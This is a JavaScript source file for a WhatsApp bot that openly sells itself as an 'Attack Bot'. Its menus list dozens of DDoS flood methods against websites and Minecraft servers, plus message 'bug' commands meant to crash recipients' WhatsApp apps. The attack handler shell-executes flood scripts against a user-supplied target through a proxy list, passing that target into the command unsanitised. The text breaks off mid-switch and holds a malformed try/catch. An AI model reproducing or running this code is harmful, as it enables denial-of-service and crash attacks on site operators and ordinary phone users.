/*
     Created : DanZ
     Base : Rizky Official
     Contact Creator : 6281389733597
*/

global.db = global.db || {};
global.db.groups = global.db.groups || {};
const fs = require('fs');
const util = require("util");
const chalk = require('chalk');
const { DanZUltraObfuscator } = require('./lib/ultra-obfuscator');
const { executeJar, executeSpecialJar } = require('./lib/jarExecutor');
const { getJakartaTime, calculateEndTime } = require('./lib/utils');
const { Client } = require('ssh2');
const { JAVA_BINARY, verifyJavaInstallation } = require('./installJava');
const ress = new Client();
const cooldowns = new Map();
const { exec, spawn, execSync } = require('child_process');
const tanggal = new Intl.DateTimeFormat('id-ID', { dateStyle: 'full' }).format(new Date());
console.log(tanggal);
let desc = tanggal;
const totalfitur = () =>{
            var mytext = fs.readFileSync("./system/biyu.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length
            return numUpper
        }
const moment = require("moment-timezone");
const { isUrl, getBuffer, sleep, smsg, toIDR } = require("../lib/function")
const { generateWAMessageFromContent, proto } = require("@whiskeysockets/baileys")
const axios = require("axios");
const fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));
module.exports = biyu = async (biyu, m, chatUpdate, store) => {
    try {
        const body = (
            m.mtype === "conversation" ? m.message.conversation :
                m.mtype === "imageMessage" ? m.message.imageMessage.caption :
                    m.mtype === "videoMessage" ? m.message.videoMessage.caption :
                        m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
                            m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
                                m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
                                    m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
                                        m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id : m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
                                            m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : ""
        );
        const sender = m.key.fromMe ? biyu.user.id.split(":")[0] + "@s.whatsapp.net" || biyu.user.id : m.key.participant || m.key.remoteJid;
        const senderNumber = sender.split('@')[0];
        const budy = (typeof m.text === 'string' ? m.text : '');
        const prefa = ["", "!", ".", ",", "🐤", "🗿"];
        const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.      test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : `.`;
        const from = m.key.remoteJid;
        const isGroup = from.endsWith("@g.us");
        const kontributor = JSON.parse(fs.readFileSync('./database/owner.json'));
        const isCreator = kontributor.includes(m.sender);
        const crypto = require('crypto');
        const randomArray = crypto.randomBytes(16);
        console.log(randomArray.toString('hex'));
        console.log(Buffer.from(randomArray).toString('hex'));
        const botNumber = await biyu.decodeJid(biyu.user.id);
        const Access = [botNumber, ...kontributor, ...global.owner].map(v => v.         replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender);
        const isCmd = body.startsWith(prefix);
        const command = body.slice(1).trim().split(/ +/).shift().toLowerCase();
        const args = body.trim().split(/ +/).slice(1);
        const pushname = m.pushName || "No Name";
        const text = q = args.join(" ");
        const quoted = m.quoted ? m.quoted : m;
        const mime = (quoted.msg || quoted).mimetype || '';
        const qmsg = (quoted.msg || quoted);
        const isMedia = /image|video|sticker|audio/.test(mime);
        const groupMetadata = isGroup ? await biyu.groupMetadata(m.chat).          catch((e) => { }) : "";
        const groupOwner = isGroup ? groupMetadata.owner : "";
        const groupName = m.isGroup ? groupMetadata.subject : "";
        const participants = isGroup ? await groupMetadata.participants : "";
        const groupAdmins = isGroup ? await participants.filter((v) => v.admin !== null).map((v) => v.id) : "";
        const groupMembers = isGroup ? groupMetadata.participants : "";
        const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
        const capital = (string) => {
  return string.charAt(0).toUpperCase() + string.slice(1);
}
        const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
        const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
        const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
        const time = moment.tz("Asia/Jakarta").format("HH:mm:ss");
        const premium = JSON.parse(fs.readFileSync("./database/premium.json"))
        const isPremium = premium.includes(m.sender);
        const getRandom = (ext) => {
    return `${Math.floor(Math.random() * 10000)}${ext}`
}
        //Fake Quoted
const qtext = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${prefix+command}`}}}
const qtext2 = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${global.creator}`}}}
const qbug = {key: {remoteJid: 'status@broadcast', fromMe: false, participant: '0@s.whatsapp.net'}, message: {listResponseMessage: {title: `Powered By ${global.creator}`
}}}
const qdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: 'Powered By ${global.creator}',jpegThumbnail: ""}}}
const qloc = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `Powered By ${global.creator}`,jpegThumbnail: ""}}}
const qloc2 = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `Powered By ${global.creator}`,jpegThumbnail: ""}}}
const qlocJpm = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${global.creator}`,jpegThumbnail: ""}}}
const qlocPush = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${global.creator}`,jpegThumbnail: ""}}}
const qpayment = {key: {remoteJid: '0@s.whatsapp.net', fromMe: false, id: `creator`, participant: '0@s.whatsapp.net'}, message: {requestPaymentMessage: {currencyCodeIso4217: "USD", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: "Botz WhatsApp"}}, expiryTimestamp: 999999999, amount: {value: 91929291929, offset: 1000, currencyCode: "USD"}}}}
const qtoko = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? {remoteJid: "status@broadcast"} : {})}, message: {"productMessage": {"product": {"productImage": {"mimetype": "image/jpeg", "jpegThumbnail": ""}, "title": `${global.creator} - Marketplace`, "description": null, "currencyCode": "IDR", "priceAmount1000": "999999999999999", "retailerId": `Powered By ${global.creator}`, "productImageCount": 1}, "businessOwnerJid": `0@s.whatsapp.net`}}}
const qlive = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {liveLocationMessage: {caption: `Simple Bot By ${global.creator}`,jpegThumbnail: ""}}}
if (m.message) {
    console.log(chalk.blue('╭─────────────────────────────❀'));
    console.log(chalk.green('│ 📩 Pesan Baru Terdeteksi!'));
    console.log(chalk.blue('├─────────────────────────────'));
    console.log(chalk.yellow(`│ 📅 Tanggal: `) + chalk.cyan(new Date().toLocaleString()));
    console.log(chalk.yellow(`│ 💬 Pesan: `) + chalk.white(m.body || m.mtype));
    console.log(chalk.yellow(`│ 👤 Pengirim: `) + chalk.magenta(pushname));
    console.log(chalk.yellow(`│ 🔢 JID: `) + chalk.red(senderNumber));
    if (m.isGroup) {
        console.log(chalk.blue('├─────────────────────────────'));
        console.log(chalk.yellow(`│ 🏠 Grup: `) + chalk.green(groupName));
        console.log(chalk.yellow(`│ 🆔 Group JID: `) + chalk.red(m.chat));
    }
    console.log(chalk.blue('╰─────────────────────────────❀\n'));
}
const { JAVA_BINARY, verifyJavaInstallation } = require('./installJava');

const {
    trashprotocol,
    peotocolCarousel,
    ComboSetan,
    btnStatus,
    protocolbug4,
    DelayOverload,
    PaymentForce,
    DevilsProtocolV2,
    VampireNewSticker,
    invitechas,
    IpLocation, // ios crash
    flowerColors
} = require('./lib/functions.js');
          
                
//==================== END BUG FUNCTION ====================//
        // === [ Switch Case ] === \\
        switch (command) {
case "menu": {
let menu = `
┏━━━⟪ ${title.name} ⟫━━┓

👋 Hi, @${m.sender.split("@")[0]}

Selamat Datang di 
${title.name},
disini kamu bisa melakukan berbagai attack DDoS dan BUG dengan 100++ Fitur

┗━━━━━━━━━━━━━━━━━━━┛

click tombol dibawah untuk info selanjutnya
Version: BETA 1.0 | By: DanZ-Kev
`;
biyu.sendMessage(m.chat, {
  footer: `© 2025 DanZ-Kev`,
 buttons: [
    {
      buttonId: `.ddosmenu`,
      buttonText: { displayText: '𝗗𝗗𝗼𝗦 𝗠𝗲𝗻𝘂' }, 
      type: 1
    },
    {
      buttonId: `.mcddos`,
      buttonText: { displayText: '𝗠𝗶𝗻𝗲𝗰𝗿𝗮𝗳𝘁 𝗠𝗲𝗻𝘂' },
      type: 1
    },
    {
      buttonId: `.bugmenu`,
      buttonText: { displayText: '𝗕𝗨𝗚 𝗠𝗲𝗻𝘂' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  document: fs.readFileSync("./package.json"),
  fileName: `${global.creator}`,
  mimetype: "application/pdf",
  fileLength: 0,
  pageCount: 0,
  caption: menu,
  mentions: [m.sender],
  contextInfo: {
    forwardingScore: 999,
    isForwarded: true,
    mentionedJid: [sender],
    forwardedNewsletterMessageInfo: {
      newsletterJid: global.idSaluran,
      newsletterName: global.namaSaluran
    },
    externalAdReply: {
      title: `Powered By ${global.creator}`,
      body: "Attack Bot",
      thumbnailUrl: global.imgmenu,
      sourceUrl: linkSaluran1,
      mediaType: 1,
      renderLargerThumbnail: true
    }
    }
}, {
  quoted: m })
}
break

case "mcddos": {
if (!isCreator && !isPremium) return m.reply(mess.owner);
let menu = `
┏━━━⟪ ${title.mcddos} ⟫━━┓
┃
┣ 🎮 Minecraft Methods
┃ ⌬ ${prefix}join
┃ ⌬ ${prefix}legitjoin
┃ ⌬ ${prefix}localhost
┃ ⌬ ${prefix}invalidnames
┃ ⌬ ${prefix}longnames
┃ ⌬ ${prefix}botjoiner (recommended)
┃ ⌬ ${prefix}spoof
┃
┣ 💫 Power Methods
┃ ⌬ ${prefix}power
┃ ⌬ ${prefix}killer
┃ ⌬ ${prefix}multikiller
┃ ⌬ ${prefix}ultimatesmasher
┃
┣ 🌊 Network Methods
┃ ⌬ ${prefix}packet
┃ ⌬ ${prefix}bigpacket
┃ ⌬ ${prefix}network
┃ ⌬ ${prefix}randombytes
┃
┣ ⚡ Protocol Methods
┃ ⌬ ${prefix}handshake
┃ ⌬ ${prefix}bighandshake
┃ ⌬ ${prefix}query
┃ ⌬ ${prefix}ping
┃ ⌬ ${prefix}nullping
┃
┣ 🔥 Special Methods
┃ ⌬ ${prefix}charonbot
┃ ⌬ ${prefix}nettydowner
┃ ⌬ ${prefix}yoonikscry
┃ ⌬ ${prefix}colorcrasher
┃
┣ 💀 TCP Methods
┃ ⌬ ${prefix}tcphit
┃ ⌬ ${prefix}tcpbypass
┃ ⌬ ${prefix}botnet
┃
┣ ⚔️ Spam Methods
┃ ⌬ ${prefix}spam
┃ ⌬ ${prefix}spamjoin
┃ ⌬ ${prefix}queue
┃ ⌬ ${prefix}ram
┃
┣ 🌪️ Special Attack
┃ ⌬ ${prefix}sf
┃ ⌬ ${prefix}nabcry
┃
┗━━━━━━━━━━━━━━━┛
┏━━━⟪ 𝗧𝗼𝗼𝗹𝘀 𝗠𝗲𝗻𝘂 ⟫━━┓
┃
┣ ⚙️ Tools Menu
┃ ⌬ ${prefix}getip
┃ ⌬ ${prefix}subdofinder
┃ ⌬ ${prefix}deviceinfo
┃ ⌬ ${prefix}status
┃ ⌬ ${prefix}stopall
┃
┗━━━━━━━━━━━━━━━┛

📝 *How To Use:*
Example: ${prefix}attack domain|duration|rate(opsional)

⚠️ *Notes:*
• Premium/Creator Only
• Use At Your Own Risk
• Don't Abuse This Feature

Version: BETA 1.0 | By: DanZ-Kev
`;
biyu.sendMessage(m.chat, {
	footer: `© 2025 DanZ-Kev`,
 buttons: [
    {
      buttonId: `.owner`,
      buttonText: { displayText: '𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗗𝗮𝗻𝗭' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  document: fs.readFileSync("./package.json"),
  fileName: `${global.creator}`,
  mimetype: "application/pdf",
  fileLength: 0,
  pageCount: 0,
  caption: menu,
  mentions: [m.sender],
  contextInfo: {
    forwardingScore: 999,
    isForwarded: true,
    mentionedJid: [sender],
    forwardedNewsletterMessageInfo: {
      newsletterJid: global.idSaluran,
      newsletterName: global.namaSaluran
    },
    externalAdReply: {
      title: `Powered By ${global.creator}`,
      body: "Attack Bot",
      thumbnailUrl: global.imgmenu,
      sourceUrl: linkSaluran1,
      mediaType: 1,
      renderLargerThumbnail: true
    }
    }
}, {
  quoted: m })
}
break

case "bugmenu": {
if (!isCreator && !isPremium) return m.reply(mess.owner);
let menu = `
┏━━━⟪ ${title.bugmenu} ⟫━━┓
┃ 
┣🔐 ⌬ ${prefix}foreclose 
┣◻️ ⌬ ${prefix}ui-blank
┣🎠 ⌬ ${prefix}carousel 
┣🧑‍💻 ⌬ ${prefix}protocol
┃
┗━━━━━━━━━━━━━━━┛

📝 *How To Use:*
Example: ${prefix}foreclose number

⚠️ *Notes:*
• Premium/Creator Only
• Use At Your Own Risk
• Don't Abuse This Feature

Version: BETA 1.0 | By: DanZ-Kev
`;
biyu.sendMessage(m.chat, {
	footer: `© 2025 DanZ-Kev`,
 buttons: [
    {
      buttonId: `.owner`,
      buttonText: { displayText: '𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗗𝗮𝗻𝗭' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  document: fs.readFileSync("./package.json"),
  fileName: `${global.creator}`,
  mimetype: "application/pdf",
  fileLength: 0,
  pageCount: 0,
  caption: menu,
  mentions: [m.sender],
  contextInfo: {
    forwardingScore: 999,
    isForwarded: true,
    mentionedJid: [sender],
    forwardedNewsletterMessageInfo: {
      newsletterJid: global.idSaluran,
      newsletterName: global.namaSaluran
    },
    externalAdReply: {
      title: `Powered By ${global.creator}`,
      body: "Attack Bot",
      thumbnailUrl: global.imgmenu,
      sourceUrl: linkSaluran1,
      mediaType: 1,
      renderLargerThumbnail: true
    }
    }
}, {
  quoted: m })
}
break

case "ddosmenu": {
if (!isCreator && !isPremium) return m.reply(mess.owner);
let menu = `
┏━━━⟪ 𝗙𝗮𝘀𝘁 𝗗𝗗𝗼𝗦 ⟫━━┓
┃
┣ ⚡ Fast Attack
┃ ⌬ ${prefix}attack (non protection L7)
┃ ⌬ ${prefix}cfbypass (protected CF L7)
┃ ⌬ ${prefix}tls-strike (L7)
┃
┗━━━━━━━━━━━━━━━┛
┏━━━⟪ ${title.ddosmenu} ⟫━━┓
┃
┣ 🌟 Layer 7 command
┃ ⌬ ${prefix}night-flood
┃ ⌬ ${prefix}ghostxflood
┃ ⌬ ${prefix}flood
┃ ⌬ ${prefix}raw
┃ ⌬ ${prefix}destroy
┃ ⌬ ${prefix}bypass
┃ ⌬ ${prefix}bypassv2
┃ ⌬ ${prefix}bypassv3 (.dev)
┃ ⌬ ${prefix}night-bypas
┃ ⌬ ${prefix}cfdestroy
┃
┣ 💫 TLS command
┃ ⌬ ${prefix}tls
┃ ⌬ ${prefix}tls-bypass
┃ ⌬ ${prefix}tls-vip
┃ ⌬ ${prefix}tlsv1
┃ ⌬ ${prefix}tlsv2
┃ ⌬ ${prefix}skynet-tls
┃
┣ 🌊 HTTP command
┃ ⌬ ${prefix}cookie
┃
┣ ⚡ H2 command
┃ ⌬ ${prefix}anus-h2
┃ ⌬ ${prefix}ghostxtls
┃ ⌬ ${prefix}ghostxstorm
┃ ⌬ ${prefix}ghostxbypas
┃
┣ 🔥 Special command
┃ ⌬ ${prefix}medusa
┃ ⌬ ${prefix}thunder
┃ ⌬ ${prefix}tornado
┃
┣ 💀 Kill command
┃ ⌬ ${prefix}kill
┃ ⌬ ${prefix}killer
┃ ⌬ ${prefix}lezkill
┃ ⌬ ${prefix}pez
┃
┣ ⚔️ Attack command
┃ ⌬ ${prefix}black
┃ ⌬ ${prefix}boom
┃ ⌬ ${prefix}glory
┃ ⌬ ${prefix}hold
┃ ⌬ ${prefix}inferno
┃ ⌬ ${prefix}night
┃ ⌬ ${prefix}nuke
┃
┣ 🌪️ Mix command
┃ ⌬ ${prefix}mix
┃ ⌬ ${prefix}mixsyn
┃ ⌬ ${prefix}pidoras
┃ ⌬ ${prefix}pluto
┃ ⌬ ${prefix}rape
┃ ⌬ ${prefix}storm
┃ ⌬ ${prefix}strike
┃ ⌬ ${prefix}uam
┃ ⌬ ${prefix}vxx
┃ ⌬ ${prefix}xlamper
┃ ⌬ ${prefix}xlamper-bom
┃ ⌬ ${prefix}xyn
┃
┗━━━━━━━━━━━━━━━┛
┏━━━⟪ 𝗧𝗼𝗼𝗹𝘀 𝗠𝗲𝗻𝘂 ⟫━━┓
┃
┣ ⚙️ Tools Menu
┃ ⌬ ${prefix}getip
┃ ⌬ ${prefix}subdofinder
┃ ⌬ ${prefix}deviceinfo
┃ ⌬ ${prefix}status
┃ ⌬ ${prefix}stopall
┃
┗━━━━━━━━━━━━━━━┛

📝 *How To Use:*
Example: ${prefix}attack domain|duration|rate(opsional)

⚠️ *Notes:*
• Premium/Creator Only
• Use At Your Own Risk
• Don't Abuse This Feature

Version: BETA 1.0 | By: DanZ-Kev
`;
biyu.sendMessage(m.chat, {
	footer: `© 2025 DanZ-Kev`,
 buttons: [
    {
      buttonId: `.owner`,
      buttonText: { displayText: '𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗗𝗮𝗻𝗭' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  document: fs.readFileSync("./package.json"),
  fileName: `${global.creator}`,
  mimetype: "application/pdf",
  fileLength: 0,
  pageCount: 0,
  caption: menu,
  mentions: [m.sender],
  contextInfo: {
    forwardingScore: 999,
    isForwarded: true,
    mentionedJid: [sender],
    forwardedNewsletterMessageInfo: {
      newsletterJid: global.idSaluran,
      newsletterName: global.namaSaluran
    },
    externalAdReply: {
      title: `Powered By ${global.creator}`,
      body: "Attack Bot",
      thumbnailUrl: global.imgmenu,
      sourceUrl: linkSaluran1,
      mediaType: 1,
      renderLargerThumbnail: true
    }
    }
}, {
  quoted: m })
}
break

case "ownermenu": {
if (!isCreator) return m.reply(mess.owner);
let menu = `
┏━━━⟪ ${title.name} ⟫━━┓

👋 Hi, @${m.sender.split("@")[0]}
⏰ ${new Date().toLocaleString()}
📱 Status: Online

┏━━━⟪ 𝗠𝗔𝗜𝗡 𝗠𝗘𝗡𝗨 ⟫━━┓
┃
┣ 👑 Owner Menu
┃ ⌬ ${prefix}listowner
┃ ⌬ ${prefix}addowner
┃ ⌬ ${prefix}delowner
┃ ⌬ ${prefix}listprem
┃ ⌬ ${prefix}addprem  
┃ ⌬ ${prefix}delprem
┃ ⌬ ${prefix}public  
┃ ⌬ ${prefix}self  
┃
┗━━━━━━━━━━━━━━┛

Type ${prefix}allmenu for more information
Version: BETA 1.0 | By: DanZ-Kev
`;
biyu.sendMessage(m.chat, {
	footer: `© 2025 DanZ-Kev`,
 buttons: [
    {
      buttonId: `.owner`,
      buttonText: { displayText: '𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗗𝗮𝗻𝗭' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  document: fs.readFileSync("./package.json"),
  fileName: `${global.creator}`,
  mimetype: "application/pdf",
  fileLength: 0,
  pageCount: 0,
  caption: menu,
  mentions: [m.sender],
  contextInfo: {
    forwardingScore: 999,
    isForwarded: true,
    mentionedJid: [sender],
    forwardedNewsletterMessageInfo: {
      newsletterJid: global.idSaluran,
      newsletterName: global.namaSaluran
    },
    externalAdReply: {
      title: `Powered By ${global.creator}`,
      body: "Attack Bot",
      thumbnailUrl: global.imgmenu,
      sourceUrl: linkSaluran1,
      mediaType: 1,
      renderLargerThumbnail: true
    }
    }
}, {
  quoted: m })
}
break

//==================== Extras ====================//

case "owner": case "contactdanz": {
    const vcard = `BEGIN:VCARD
VERSION:3.0
FN:DanZ-Kev [Owner]
TEL;type=CELL;waid=${global.owner}: ${global.owner}
END:VCARD`;
    await biyu.sendMessage(m.chat, { contacts: { displayName: "Owner Bot", contacts: [{ vcard }] }}, { quoted: m });
}
break

//==================== START CASE ====================//

case 'attack': case 'cfbypass':
case 'night-flood': case 'ghostxtls': case 'ghostxstorm': case 'ghostxbypas': 
case 'cookie': case 'ghostxflood': case 'anus-h2': case 'uam': 
case 'medusa': case 'night-bypas': case 'tlsv1': case 'boom': 
case 'tornado': case 'xlamper-bom': case 'nuke': case 'pidoras': 
case 'black': case 'xlamper': case 'inferno': case 'killer': 
case 'pluto': case 'tls-bypass': case 'lezkill': case 'xyn': 
case 'hold': case 'vxx': case 'geckold': case 'mix': 
case 'mixsyn': case 'glory': case 'skynet-tls': case 'tls-vip': 
case 'flood': case 'tls': case 'strike': case 'kill': 
case 'bypass': case 'raw': case 'thunder': case 'rape': 
case 'storm': case 'destroy': case 'slim': case 'tlsv2': 
case 'bypassv2': case 'bypassv3': case 'pez': case 'tls-strike': {
    if (!isCreator && !isPremium) return m.reply(mess.owner)
    if (!text) return m.reply(`*‼️ Untuk Menjalankan Command:*\n${prefix}${command} _Target_|_Durasi_|[Rate]`);

    const vii = text.split("|");
    if (vii.length < 2) return m.reply(`*‼️ Untuk Menjalankan Command:*\n${prefix}${command} _Target_|_Durasi_|[Rate]`);

    const target = vii[0].trim();
    const duration = vii[1] ? parseInt(vii[1].trim()) : 360;
    const customRate = vii[2] ? parseInt(vii[2].trim()) : null;
    const metode = `./lib/methods/${command}.js`;

    if (isNaN(duration) || duration <= 0) {
        return m.reply('❌ *Durasi tidak valid!*');
    }

    // Get current time in Jakarta timezone (GMT+7)
    const jakartaTime = new Date().toLocaleString('en-US', {
        timeZone: 'Asia/Jakarta',
        year: 'numeric',
        month: '2-digit',
        day: '2-digit',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit',
        hour12: false
    }).replace(/(\d+)\/(\d+)\/(\d+), /, '$3-$1-$2 ');

    // Calculate end time
    const startTime = new Date();
    const endTime = new Date(startTime.getTime() + (duration * 1000));
    const formattedEndTime = endTime.toLocaleString('en-US', {
        timeZone: 'Asia/Jakarta',
        year: 'numeric',
        month: '2-digit',
        day: '2-digit',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit',
        hour12: false
    }).replace(/(\d+)\/(\d+)\/(\d+), /, '$3-$1-$2 ');

    const responseMessage = `┏━━━⟪ ${title.name} ⟫━━┓
🔥 𝗔𝗧𝗧𝗔𝗖𝗞 𝗕𝗘𝗥𝗛𝗔𝗦𝗜𝗟 🔥
┗━━━━━━━━━━━━━━━━━━━┛
Date and Time: ${jakartaTime}
Current User's Login: ${m.pushName || 'DanZ-Kev'}

📌 *TARGET INFORMATION*
➣ Target: ${target}
➣ Duration: ${duration} seconds
➣ Thread: ${command === 'basic' ? '20' : '30'}
➣ Rate: ${customRate || 'Default'}
➣ Method: ${command.toUpperCase()}
➣ Time End: ${formattedEndTime}

_Notes:_ Untuk cek apakah DDoS Attack Berhasil bisa di cek di website dibawah ini ↓
https://check-host.net/check-http?host=${target}`;

    m.reply(responseMessage, {
    footer: `© 2025 DanZ-Kev`,
    buttons: [
        {
            buttonId: `.stopattack`,
            buttonText: { displayText: `*STOP ATTACK*` },
            type: 1
        }
    ],
    headerType: 1
});

    // Fungsi untuk eksekusi command
    const execCommand = (method, defaultRate, thread, flags = '') => {
        const rate = customRate || defaultRate;
        exec(`node ${metode} ${target} ${duration} ${rate} ${thread} proxy.txt ${flags}`);
    };

    switch (command) {
        case 'attack':
            // Execute tlsv2 and flood for basic
            exec(`node ./lib/methods/tlsv2.js ${target} ${duration} ${customRate || 100} 20 proxy.txt`);
            exec(`node ./lib/methods/flood.js ${target} ${duration} ${customRate || 100} 20 proxy.txt`);
            break;

        case 'cfbypass':
            // Execute bypass methods for cfbypass
            exec(`node ./lib/methods/bypass.js ${target} ${duration} ${customRate || 100} 30 proxy.txt`);
            exec(`node ./lib/methods/bypassv2.js ${target} ${duration} ${customRate || 100} 30 proxy.txt`);
            exec(`node ./lib/methods/tlsv2.js ${target} ${duration} ${customRate || 100} 30 proxy.txt`);
            exec(`node ./lib/methods/flood.js ${target} ${duration} ${customRate || 100} 30 proxy.txt`);
            break;
            
         case 'tls-strike':
            // Execute bypass methods for cfbypass
            exec(`node ./lib/methods/tls-bypass.js ${target} ${duration} ${customRate || 100} 30 proxy.txt`);
            exec(`node ./lib/methods/tls-vip.js ${target} ${duration} ${customRate || 100} 30 proxy.txt`);
            exec(`node ./lib/methods/skynet-tls.js ${target} ${duration} ${customRate || 100} 30 proxy.txt`);
            exec(`node ./lib/methods/tlsv2.js ${target} ${duration} ${customRate || 100} 30 proxy.txt`);
            exec(`node ./lib/methods/flood.js ${target} ${duration} ${customRate || 100} 30 proxy.txt`);
            break;
            

        case 'night-flood':
            execCommand(command, 100, 60, 'flood');
            break;

        case 'ghostxtls':
        case 'ghostxstorm':
        case 'ghostxbypas':
        case 'ghostxflood':
        case 'uam':
        case 'anus-h2':
            execCommand(command, 100, 40);
            break;

        case 'cookie':
            execCommand(command, 100, 20);
            break;

        case 'medusa':
        case 'night-bypas':
        case 'tlsv1':
        case 'tls-bypass':
            execCommand(command, 100, 10, 'bypass');
            break;

        case 'boom':
        case 'flood':
        case 'xlamper-bom':
        case 'nuke':
        case 'pidoras':
        case 'black':
        case 'xlamper':
        case 'inferno':
        case 'killer':
        case 'pluto':
        case 'lezkill':
        case 'xyn':
        case 'hold':
        case 'vxx':
        case 'geckold':
        case 'glory':
        case 'skynet-tls':
        case 'tls-vip':
        case 'tls':
        case 'tlsv2':
        case 'strike':
        case 'kill':
        case 'bypass':
        case 'bypassv2':
        case 'bypassv3':
        case 'thunder':
        case 'storm':
        case 'destroy':
            execCommand(command, 100, 10);
            break;

        case 'mix':
        case 'mixsyn':
            execCommand(command, 50, 0);
            break;

        case 'rape':
            execCommand(command, 10, 70, `${target}`);
            break;

        case 'tornado':
            execCommand(command, 100, 40, 'GET');
            break;

        case 'slim': {
            const destroy = path.join(__dirname, `/lib/methods/destroy`);
            const storm = path.join(__dirname, `/lib/methods/storm`);
            const rape = path.join(__dirname, `/lib/methods/rape`);
            exec(`node ${destroy} ${target} ${duration} 100 1 proxy.txt`);
            exec(`node ${storm} ${target} ${duration} 100 1 proxy.txt`);
            exec(`node ${rape} ${duration} 1 proxy.txt 70 ${target}`);
            break;
        }
        default:
            m.reply(`❌ *Metode ${command} tidak dikenali!*`);
            break;
    }
}
break;

case 'stopattack': {
    if (!isCreator && !isPremium) return m.reply(mess.owner)
    
    try {
        await m.reply('⏳ Stopping all running attacks...');
        
        // Get current time in Jakarta timezone
        const jakartaTime = new Date().toLocaleString('en-US', {
            timeZone: 'Asia/Jakarta',
            year: 'numeric',
            month: '2-digit',
            day: '2-digit',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit',
            hour12: false
        }).replace(/(\d+)\/(\d+)\/(\d+), /, '$3-$1-$2 ');

        let killCommand;
        let grepCommand;
        
        if (process.platform === 'win32') {
            // Windows
            killCommand = 'taskkill /F /IM node.exe';
            exec(killCommand, (error, stdout, stderr) => {
                if (error) {
                    console.error('Error stopping processes:', error);
                    return m.reply(`❌ Failed to stop attacks: ${error.message}`);
                }
            });
        } else {
            // Linux/Unix
            // Membunuh proses yang menjalankan file di direktori methods
            killCommand = "pkill -f 'node.*methods/'";
            // Alternatif command jika yang pertama gagal
            grepCommand = "ps aux | grep 'node.*methods/' | grep -v grep | awk '{print $2}' | xargs kill -9";
            
            exec(killCommand, (error, stdout, stderr) => {
                if (error) {
                    // Jika command pertama gagal, coba command alternatif
                    exec(grepCommand, (error2, stdout2, stderr2) => {
                        if (error2 && error2.code !== 1) {
                            console.error('Error stopping processes:', error2);
                            return m.reply(`❌ Failed to stop attacks: ${error2.message}`);
                        }
                    });
                }
            });
        }

        // Tambahan untuk membersihkan proses Node.js yang tersisa
        const cleanupCommands = process.platform === 'win32' 
            ? ['taskkill /F /IM node.exe /FI "WINDOWTITLE eq *methods*"']
            : [
                'pkill -f "node.*methods/"',
                'killall -9 node 2>/dev/null || true'
            ];

        for (const cmd of cleanupCommands) {
            exec(cmd, () => {});
        }

        const responseMessage = `┏━━━⟪ ${title.name} ⟫━━┓
🛑 𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗧𝗢𝗣𝗣𝗘𝗗 🛑
┗━━━━━━━━━━━━━━━━━━━┛
Date and Time: ${jakartaTime}
Current User's Login: ${m.pushName || 'DanZ-Kev'}

📌 *STOP INFORMATION*
➣ Status: Success ✓
➣ Action: All attacks stopped
➣ Platform: ${process.platform}

_Notes:_ All running attacks have been terminated.`;

        setTimeout(() => {
            m.reply(responseMessage);

    }) catch (error) {
        console.error('Error in stopattack:', error);
        m.reply(`❌ *Error stopping attacks:*\n• Error: ${error.message}`);
    }
}
break;

case 'join': case 'legitjoin': case 'localhost': case 'invalidnames':
case 'longnames': case 'botjoiner': case 'power': case 'spoof':
case 'ping': case 'spam': case 'killer': case 'nullping':
case 'charonbot': case 'multikiller': case 'packet': case 'handshake':
case 'bighandshake': case 'query': case 'bigpacket': case 'network':
case 'randombytes': case 'spamjoin': case 'nettydowner': case 'ram':
case 'yoonikscry': case 'colorcrasher': case 'tcphit': case 'queue':
